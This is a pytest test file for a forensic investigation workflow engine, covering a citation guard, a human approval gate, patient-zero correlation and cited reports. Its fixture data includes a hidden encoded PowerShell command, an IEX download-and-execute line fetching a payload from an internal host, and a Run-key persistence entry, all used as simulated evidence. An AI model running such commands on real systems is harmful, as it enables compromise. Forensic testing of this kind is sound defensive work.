"""Phase 4 Verification Suite: Context-Passing LangGraph Workflow Engine & Cited Report Builder.

Standards:
- Lightweight Edge Payloads (RFC 3227 / NIST SP 800-86)
- Deterministic Tool Scoping & Anti-Hallucination Guardrails
- Human Approval Gate for High-Risk Actions
- 6-Section Cited Report with AIFT 4-Part Rubric & Multi-Host Patient Zero Correlation
"""
from __future__ import annotations

import json
from datetime import datetime, timezone
import pytest

from backend.app.agent.graph import (
    ForensicOpsWorkflowEngine,
    get_starter_blueprints,
)
from backend.app.agent.memory_protocol import SQLiteFeedbackMemoryProvider
from backend.app.agent.ollama_client import OllamaClient
from backend.app.agent.report_builder import (
    AIFTRubricItem,
    CitedReport,
    CustodyAuditSection,
    ExecutiveSummarySection,
    PatientZeroRemediationSection,
    ReportBuilder,
    TimelineEntry,
)
from backend.app.agent.tools import (
    create_view_tool,
    extract_pivots_from_findings,
    extract_pivots_from_goal_result,
    hybrid_search_tool,
    query_findings_tool,
    timeline_window_tool,
)
from backend.app.core.citation_guard import CitationGuard
from backend.app.core.exceptions import CitationValidationError, ForensicOpsError
from backend.app.core.storage import ForensicStore
from backend.app.models.findings import CitedClaim, ForensicFinding, NodeGoalResult
from backend.app.models.workflow import (
    HumanApprovalToken,
    WorkflowDefinition,
    WorkflowEdge,
    WorkflowEdgePayload,
    WorkflowExecutionState,
    WorkflowNode,
)


@pytest.fixture
def store():
    """In-memory DuckDB store fixture."""
    with ForensicStore(":memory:") as s:
        yield s


@pytest.fixture
def memory_provider(tmp_path):
    """SQLite feedback memory provider fixture."""
    db_file = tmp_path / "test_feedback.db"
    return SQLiteFeedbackMemoryProvider(db_path=db_file)


@pytest.fixture
def mock_findings(store):
    """Pre-populate store with realistic multi-host forensic telemetry."""
    findings = [
        ForensicFinding(
            finding_id="fnd-logon-01",
            case_id="case-ph4",
            source_artifact_id="art-evtx-sec",
            source_artifact_hash="a1b2c3d4e5f60000111122223333444455556666777788889999aaaabbbbcccc",
            tool_id="dissect_evtx",
            timestamp_utc="2026-10-31T01:00:00Z",
            artifact_type="evtx",
            category="authentication",
            event_id="4624",
            severity="medium",
            host="WS-01",
            user="admin_compromised",
            command_line=None,
            summary="Successful Type 3 Network Logon from source IP 192.168.1.105",
            projected_data={"TargetUserName": "admin_compromised", "IpAddress": "192.168.1.105"},
        ),
        ForensicFinding(
            finding_id="fnd-ps-01",
            case_id="case-ph4",
            source_artifact_id="art-evtx-ps",
            source_artifact_hash="b2c3d4e5f6a10000111122223333444455556666777788889999aaaabbbbcccc",
            tool_id="dissect_evtx",
            timestamp_utc="2026-10-31T01:05:00Z",
            artifact_type="evtx",
            category="process_creation",
            event_id="4104",
            severity="high",
            host="WS-01",
            user="admin_compromised",
            process_name="powershell.exe",
            command_line="powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...",
            summary="Suspicious encoded PowerShell script block execution downloading from 10.0.5.99",
            projected_data={"ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://10.0.5.99/payload.ps1')"},
        ),
        ForensicFinding(
            finding_id="fnd-reg-01",
            case_id="case-ph4",
            source_artifact_id="art-reg-ntuser",
            source_artifact_hash="c3d4e5f6a1b20000111122223333444455556666777788889999aaaabbbbcccc",
            tool_id="dissect_registry",
            timestamp_utc="2026-10-31T01:10:00Z",
            artifact_type="registry",
            category="persistence",
            severity="critical",
            host="WS-01",
            user="admin_compromised",
            process_name="svchost.exe",
            raw_reference=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
            summary=r"Persistence installed: C:\Users\admin_compromised\AppData\Local\updater.exe",
            projected_data={"Key": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "Value": "updater.exe"},
        ),
    ]
    store.insert_findings(findings)
    return findings


# -----------------------------------------------------------------------------
# Test 1: Lightweight WorkflowEdgePayload Serialization and Merge
# -----------------------------------------------------------------------------
def test_workflow_edge_payload_serialization_and_merge():
    """Verify lightweight edge payloads never carry heavy row arrays and merge correctly."""
    payload1 = WorkflowEdgePayload(
        dataset_pointer="view_evtx_case01",
        pivots={
            "compromised_users": ["alice", "bob"],
            "source_ips": ["192.168.1.50"],
            "hosts": ["WS-01"],
        },
    )

    # Check property helpers
    assert payload1.users == ["alice", "bob"]
    assert payload1.ips == ["192.168.1.50"]
    assert payload1.hosts == ["WS-01"]
    assert payload1.files == []

    # Add pivot
    payload1.add_pivot("file_paths", r"C:\Windows\System32\cmd.exe")
    assert payload1.files == [r"C:\Windows\System32\cmd.exe"]

    payload2 = WorkflowEdgePayload(
        dataset_pointer="view_reg_case01",
        pivots={
            "compromised_users": ["bob", "charlie"],
            "source_ips": ["10.0.0.1"],
            "process_names": ["powershell.exe"],
        },
    )

    merged = payload1.merge(payload2)
    assert merged.dataset_pointer == "view_reg_case01"  # Uses latest pointer
    assert set(merged.users) == {"alice", "bob", "charlie"}
    assert set(merged.ips) == {"192.168.1.50", "10.0.0.1"}
    assert merged.processes == ["powershell.exe"]
    assert merged.files == [r"C:\Windows\System32\cmd.exe"]

    # Roundtrip serialization
    d = merged.to_dict()
    reconstructed = WorkflowEdgePayload.from_dict(d)
    assert reconstructed.users == merged.users
    assert reconstructed.ips == merged.ips
    assert reconstructed.dataset_pointer == merged.dataset_pointer


# -----------------------------------------------------------------------------
# Test 2: Starter Workflow Blueprints Validity
# -----------------------------------------------------------------------------
def test_starter_workflow_blueprints_validity():
    """Verify all 4 starter blueprints define valid DAG structures with correct node types."""
    blueprints = get_starter_blueprints()
    assert len(blueprints) == 4
    expected_keys = {"windows_intrusion", "full_windows_triage", "linux_ssh_compromise", "memory_pcap_hunt"}
    assert set(blueprints.keys()) == expected_keys

    for name, bp in blueprints.items():
        assert len(bp.nodes) >= 5, f"Blueprint {name} has too few nodes"
        assert len(bp.edges) >= 4, f"Blueprint {name} has too few edges"

        node_ids = {n.id for n in bp.nodes}
        assert bp.nodes[0].type == "evidence_input", f"Blueprint {name} must start with evidence_input"
        assert bp.nodes[-1].type == "report_compiler", f"Blueprint {name} must end with report_compiler"

        # Check edge validity
        for e in bp.edges:
            assert e.source in node_ids, f"Edge source {e.source} not in {name} nodes"
            assert e.target in node_ids, f"Edge target {e.target} not in {name} nodes"

    # Specific check for Linux SSH blueprint containing Human Approval Gate
    linux_bp = blueprints["linux_ssh_compromise"]
    gate_nodes = [n for n in linux_bp.nodes if n.type == "human_approval_gate"]
    assert len(gate_nodes) == 1
    assert gate_nodes[0].id == "node_gate"


# -----------------------------------------------------------------------------
# Test 3: Deterministic Forensic Tools and Pivot Extraction
# -----------------------------------------------------------------------------
def test_deterministic_forensic_tools_and_pivot_extraction(store, mock_findings):
    """Verify deterministic querying, timeline windowing, view creation, and regex entity extraction."""
    # 1. Structured query tool
    res = query_findings_tool(store, case_id="case-ph4", filters={"artifact_type": "evtx"})
    assert len(res) == 2

    # 2. Timeline window tool
    window = timeline_window_tool(
        store,
        case_id="case-ph4",
        pivot_timestamp_utc="2026-10-31T01:05:00Z",
        window_before_seconds=600,
        window_after_seconds=600,
    )
    assert len(window) == 3

    # 3. Hybrid search tool
    hits = hybrid_search_tool(store, query="powershell download payload", case_id="case-ph4")
    assert len(hits) >= 1
    assert hits[0].finding_id == "fnd-ps-01"

    # 4. View creation tool
    view_name = create_view_tool(store, "test_view_evtx", {"artifact_type": "evtx"}, case_id="case-ph4")
    assert view_name == "test_view_evtx"

    # 5. Pivot extraction from findings
    pivots = extract_pivots_from_findings(mock_findings)
    assert pivots["compromised_users"] == ["admin_compromised"]
    assert pivots["hosts"] == ["WS-01"]
    assert "powershell.exe" in pivots["process_names"]
    # Check IP extraction from summaries
    assert "192.168.1.105" in pivots["source_ips"]
    assert "10.0.5.99" in pivots["source_ips"]
    # Check file path extraction
    assert any("updater.exe" in p for p in pivots["file_paths"])
    assert "fnd-logon-01" in pivots["verified_finding_ids"]


# -----------------------------------------------------------------------------
# Test 4: AI Goal Step Context Passing and Citation Guard
# -----------------------------------------------------------------------------
def test_ai_goal_step_context_passing_and_citation_guard(store, memory_provider, mock_findings):
    """Verify AI Goal Step consumes incoming pivots, queries store, and passes CitationGuard."""
    engine = ForensicOpsWorkflowEngine(
        storage=store,
        memory_provider=memory_provider,
        ollama_client=OllamaClient(mock_mode=True),
        citation_guard=CitationGuard(store),
    )

    node = WorkflowNode(
        id="goal_node_01",
        name="Analyze Logon Spikes",
        type="ai_goal_step",
        config={"goal": "Identify compromised user accounts from authentication logs", "artifact_type": "evtx"},
    )

    handler = engine._make_ai_goal_step_node(node)
    init_state = WorkflowExecutionState(
        case_id="case-ph4",
        workflow_id="wf-test",
        active_payload=WorkflowEdgePayload(
            pivots={"compromised_users": ["admin_compromised"], "hosts": ["WS-01"]}
        ),
    )

    result_dict = handler(init_state)
    assert result_dict["current_node_id"] == "goal_node_01"
    assert "goal_node_01" in result_dict["completed_nodes"]
    assert "goal_node_01" in result_dict["node_results"]

    goal_res = result_dict["node_results"]["goal_node_01"]
    assert isinstance(goal_res, NodeGoalResult)
    assert goal_res.status == "success"
    # Claim must cite verified finding
    assert len(goal_res.claims) >= 1
    assert goal_res.claims[0].citing_finding_ids[0] in [f.finding_id for f in mock_findings]

    # Pivots should be carried forward into active_payload
    payload = result_dict["active_payload"]
    assert "admin_compromised" in payload.users


# -----------------------------------------------------------------------------
# Test 5: Human Approval Gate Pause and Resume
# -----------------------------------------------------------------------------
def test_human_approval_gate_pause_and_resume(store, memory_provider):
    """Verify Human Approval Gate halts workflow cleanly when unapproved and resumes upon token validation."""
    engine = ForensicOpsWorkflowEngine(
        storage=store,
        memory_provider=memory_provider,
        secret_key="unit-test-secret-key",
    )

    workflow_def = WorkflowDefinition(
        workflow_id="test_wf_gate",
        name="Test Workflow with Gate",
        nodes=[
            WorkflowNode(id="n1", name="Input", type="evidence_input"),
            WorkflowNode(id="gate", name="Containment Approval", type="human_approval_gate"),
            WorkflowNode(id="n2", name="Report", type="report_compiler"),
        ],
        edges=[
            WorkflowEdge(source="n1", target="gate"),
            WorkflowEdge(source="gate", target="n2"),
        ],
    )

    # 1. Execute without token: should pause at gate
    state = engine.execute_workflow(workflow_def, case_id="case-gate")
    assert state.is_paused is True
    assert state.pause_node_id == "gate"
    assert "Awaiting Human Approval Token" in (state.pause_reason or "")
    assert "n1" in state.completed_nodes
    assert "gate" not in state.completed_nodes
    assert "n2" not in state.completed_nodes

    # 2. Try to resume with forged/invalid token: should raise error
    invalid_token = HumanApprovalToken(
        node_id="gate",
        case_id="case-gate",
        signature="invalid-forged-signature",
    )
    with pytest.raises(ForensicOpsError, match="Invalid or forged HumanApprovalToken"):
        engine.resume_workflow(workflow_def, state, invalid_token)

    # 3. Resume with valid signed token
    valid_token = HumanApprovalToken(node_id="gate", case_id="case-gate")
    valid_token.sign("unit-test-secret-key")

    resumed_state = engine.resume_workflow(workflow_def, state, valid_token)
    assert resumed_state.is_paused is False
    assert resumed_state.pause_node_id is None
    assert "n1" in resumed_state.completed_nodes
    assert "gate" in resumed_state.completed_nodes
    assert "n2" in resumed_state.completed_nodes
    assert resumed_state.report is not None


# -----------------------------------------------------------------------------
# Test 6: LangGraph Engine DAG Execution of Windows Intrusion Blueprint
# -----------------------------------------------------------------------------
def test_langgraph_engine_dag_execution_windows_intrusion(store, memory_provider, mock_findings):
    """Execute the full Windows Intrusion blueprint through LangGraph and verify end-to-end execution."""
    engine = ForensicOpsWorkflowEngine(
        storage=store,
        memory_provider=memory_provider,
        ollama_client=OllamaClient(mock_mode=True),
        citation_guard=CitationGuard(store),
    )

    blueprints = get_starter_blueprints()
    bp = blueprints["windows_intrusion"]

    state = engine.execute_workflow(bp, case_id="case-ph4")
    assert state.is_paused is False
    assert len(state.completed_nodes) == len(bp.nodes)
    assert state.completed_nodes[-1] == "node_report"
    assert state.report is not None

    # Check that AI goal step results exist in state
    assert "node_ai_logon" in state.node_results
    assert "node_ai_ps" in state.node_results
    assert "node_ai_persist" in state.node_results

    # Check that report has required sections
    report_dict = state.report
    assert report_dict["case_id"] == "case-ph4"
    assert "executive_summary" in report_dict
    assert "aift_rubric" in report_dict
    assert "patient_zero_and_remediation" in report_dict


# -----------------------------------------------------------------------------
# Test 7: AIFT Rubric 4-Part Enforcement
# -----------------------------------------------------------------------------
def test_aift_rubric_4_part_enforcement(store, mock_findings):
    """Verify that ReportBuilder extracts and structures the 4-part AIFT rubric for all claims."""
    f0 = mock_findings[0]
    claim = CitedClaim(
        claim_type="observed_fact",
        statement="Compromised user admin_compromised authenticated via Type 3 Network Logon",
        citing_finding_ids=[f0.finding_id],
        source_artifact_hashes=[f0.source_artifact_hash],
        confidence=1.0,
        why_it_matters="Network logon indicates initial remote lateral movement or credential abuse (MITRE T1078).",
        benign_alternative="Automated backup service or scheduled inventory scan using domain admin credentials.",
        verification_steps=[
            "Inspect source IP address 192.168.1.105 DHCP lease and MAC address.",
            "Verify whether user admin_compromised was scheduled for maintenance during this time.",
        ],
        data_gaps=["Radius/VPN authentications logs not correlated with this endpoint."],
    )

    node_res = NodeGoalResult(
        node_id="ai_node_aift",
        status="success",
        summary="AIFT Rubric validation node",
        claims=[claim],
    )

    report = ReportBuilder.build_report(
        case_id="case-ph4",
        node_results=[node_res],
        storage=store,
    )

    assert len(report.aift_rubric) == 1
    item: AIFTRubricItem = report.aift_rubric[0]
    assert item.why_it_matters.startswith("Network logon indicates")
    assert "backup service" in item.benign_alternative
    assert len(item.verification_steps) == 2
    assert len(item.data_gaps) == 1
    assert item.citing_finding_ids == [f0.finding_id]


# -----------------------------------------------------------------------------
# Test 8: Multi-Host Patient Zero Correlation
# -----------------------------------------------------------------------------
def test_multi_host_patient_zero_correlation(store):
    """Verify Patient Zero detection and lateral movement path tracing across multiple endpoints."""
    findings = [
        # Host 3: Later intrusion
        ForensicFinding(
            finding_id="fnd-host3-01",
            case_id="case-multi",
            source_artifact_id="art-evtx-03",
            source_artifact_hash="hash333333333333333333333333333333333333333333333333333333333333",
            tool_id="dissect_evtx",
            timestamp_utc="2026-10-31T03:00:00Z",
            artifact_type="evtx",
            category="process_creation",
            host="FILESERVER-02",
            user="svc_backup",
            summary="Ransomware payload execution detected",
        ),
        # Host 1: Earliest intrusion (Patient Zero)
        ForensicFinding(
            finding_id="fnd-host1-01",
            case_id="case-multi",
            source_artifact_id="art-evtx-01",
            source_artifact_hash="hash111111111111111111111111111111111111111111111111111111111111",
            tool_id="dissect_evtx",
            timestamp_utc="2026-10-31T01:00:00Z",
            artifact_type="evtx",
            category="authentication",
            host="WORKSTATION-01",
            user="svc_backup",
            process_name="powershell.exe",
            summary="Phishing lure execution and macro trigger",
        ),
        # Host 2: Intermediate pivot
        ForensicFinding(
            finding_id="fnd-host2-01",
            case_id="case-multi",
            source_artifact_id="art-evtx-02",
            source_artifact_hash="hash222222222222222222222222222222222222222222222222222222222222",
            tool_id="dissect_evtx",
            timestamp_utc="2026-10-31T02:00:00Z",
            artifact_type="evtx",
            category="process_creation",
            host="DC-01",
            user="svc_backup",
            summary="NTDS.dit credential dumping via ntdsutil",
        ),
    ]
    store.insert_findings(findings)

    # Correlate Patient Zero
    pz_sec = ReportBuilder.correlate_patient_zero(findings)
    assert pz_sec.patient_zero_host == "WORKSTATION-01"
    assert pz_sec.initial_timestamp_utc == "2026-10-31T01:00:00Z"
    assert "WORKSTATION-01" in pz_sec.initial_access_vector
    assert len(pz_sec.lateral_movement_paths) == 2
    # Confirms containment guidance points to Patient Zero
    assert any("WORKSTATION-01" in a for a in pz_sec.containment_actions)


# -----------------------------------------------------------------------------
# Test 9: 6-Section Cited Report Generation and Markdown
# -----------------------------------------------------------------------------
def test_6_section_cited_report_generation_and_markdown(store, mock_findings):
    """Verify master 6-section CitedReport structures and markdown export."""
    f0 = mock_findings[0]
    f1 = mock_findings[1]

    claims = [
        CitedClaim(
            claim_type="observed_fact",
            statement="Network logon detected from external IP",
            citing_finding_ids=[f0.finding_id],
            source_artifact_hashes=[f0.source_artifact_hash],
            confidence=1.0,
        ),
        CitedClaim(
            claim_type="derived_correlation",
            statement="Logon session directly initiated malicious PowerShell script execution",
            citing_finding_ids=[f0.finding_id, f1.finding_id],
            source_artifact_hashes=[f0.source_artifact_hash, f1.source_artifact_hash],
            confidence=0.95,
        ),
    ]

    node_res = NodeGoalResult(
        node_id="ai_summary",
        status="success",
        summary="Correlated logon to script execution",
        claims=claims,
    )

    report = ReportBuilder.build_report(
        case_id="case-ph4",
        node_results=[node_res],
        storage=store,
    )

    md = report.to_markdown()

    # Verify all 6 section titles exist in markdown
    assert "## 1. Executive Summary & Incident Timeline" in md
    assert "## 2. Chain of Custody & Projection Filter Audit Table" in md
    assert "## 3. Observed Facts" in md
    assert "## 4. Derived Correlations" in md
    assert "## 5. AIFT 4-Part Evaluative Rubric" in md
    assert "## 6. Multi-Host Patient Zero Assessment & Remediation" in md

    # Verify clickable citation formatting
    assert f"[Finding: {f0.finding_id}" in md
    assert f"Hash: {f0.source_artifact_hash[:12]}" in md


# -----------------------------------------------------------------------------
# Test 10: Cross-Case Isolation and Anti-Hallucination in Graph
# -----------------------------------------------------------------------------
def test_cross_case_isolation_and_anti_hallucination_in_graph(store, memory_provider):
    """Verify that foreign case citations or fabricated finding IDs are suppressed by CitationGuard."""
    # Insert finding into foreign case
    foreign_finding = ForensicFinding(
        finding_id="fnd-foreign-01",
        case_id="case-OTHER",
        source_artifact_id="art-foreign",
        source_artifact_hash="foreignhash000000000000000000000000000000000000000000000000000000",
        tool_id="dissect_evtx",
        artifact_type="evtx",
        category="authentication",
        summary="Foreign case finding",
    )
    store.insert_findings([foreign_finding])

    # Construct invalid result claiming finding from foreign case
    invalid_result = NodeGoalResult(
        node_id="ai_bad",
        status="success",
        summary="Hallucinated cross-case claim",
        claims=[
            CitedClaim(
                claim_type="observed_fact",
                statement="Contaminated claim from foreign case",
                citing_finding_ids=["fnd-foreign-01"],
                source_artifact_hashes=[foreign_finding.source_artifact_hash],
            )
        ],
    )

    guard = CitationGuard(store)
    # Strict validation should reject
    with pytest.raises(CitationValidationError, match="foreign case"):
        guard.validate_node_result(invalid_result, case_id="case-ph4", strict=True)

    # Non-strict validation should sanitize result
    val_report = guard.validate_node_result(invalid_result, case_id="case-ph4", strict=False)
    assert val_report.is_valid is False
    assert len(val_report.cross_case_violations) == 1
    assert len(val_report.sanitized_result.claims) == 0
    assert "suppressed by CitationGuard" in val_report.sanitized_result.summary


# -----------------------------------------------------------------------------
# Test 11: Convert Deterministic Goal Plan to Workflow DAG & Execute Skipped Node
# -----------------------------------------------------------------------------
def test_convert_goal_plan_to_workflow_and_execute_skipped_nodes(store, memory_provider):
    """Verify that a compiled DeterministicGoalPlan converts into a LangGraph workflow and handles SKIPPED_NO_ARTIFACT."""
    from backend.app.agent.graph import convert_goal_plan_to_workflow
    from backend.app.agent.hypothesis_planner import CompiledPlanStep, DeterministicGoalPlan, PlanStepStatus
    from backend.app.core.playbook_registry import ScopedFilterParams

    step_ready = CompiledPlanStep(
        step_id="step_win_evtx",
        name="Dissect Windows Security EVTX",
        tactic_id="TA0001",
        tactic_name="Initial Access",
        description="Parse Security.evtx for logon anomalies.",
        target_os="windows",
        parser_plugin="dissect_adapter.py",
        required_artifact_types=["evtx"],
        status=PlanStepStatus.READY,
        matched_artifact_ids=["art-evtx-sec"],
    )

    step_skipped = CompiledPlanStep(
        step_id="step_linux_cron",
        name="Linux Cron Persistence",
        tactic_id="TA0003",
        tactic_name="Persistence",
        description="Inspect cron jobs.",
        target_os="linux",
        parser_plugin="dissect_adapter.py",
        required_artifact_types=["collector_log"],
        status=PlanStepStatus.SKIPPED_NO_ARTIFACT,
        skip_reason="No Linux cron artifacts in vault.",
        matched_artifact_ids=[],
    )

    plan = DeterministicGoalPlan(
        case_id="case-ph4",
        investigation_goal="Investigate logon and persistence",
        auto_approve=True,
        scoped_filters=ScopedFilterParams(),
        matched_tactics=["TA0001", "TA0003"],
        steps=[step_ready, step_skipped],
    )

    wf = convert_goal_plan_to_workflow(plan)
    assert wf.workflow_id.startswith("workflow_plan-")
    assert len(wf.nodes) == 4  # intake + 2 steps + report compiler
    assert len(wf.edges) == 3

    # Execute workflow with engine
    engine = ForensicOpsWorkflowEngine(
        storage=store,
        memory_provider=memory_provider,
        secret_key="secure-hmac-test-key-32chars-min-len",
    )

    state = engine.execute_workflow(workflow_def=wf, case_id="case-ph4")
    assert state.is_paused is False
    assert f"node_{step_skipped.step_id}" in state.completed_nodes

    # Check skipped node output
    node_out = state.node_outputs.get(f"node_{step_skipped.step_id}")
    assert node_out is not None
    assert node_out["status"] == "SKIPPED_NO_ARTIFACT"
    assert "No Linux cron artifacts" in node_out["skip_reason"]

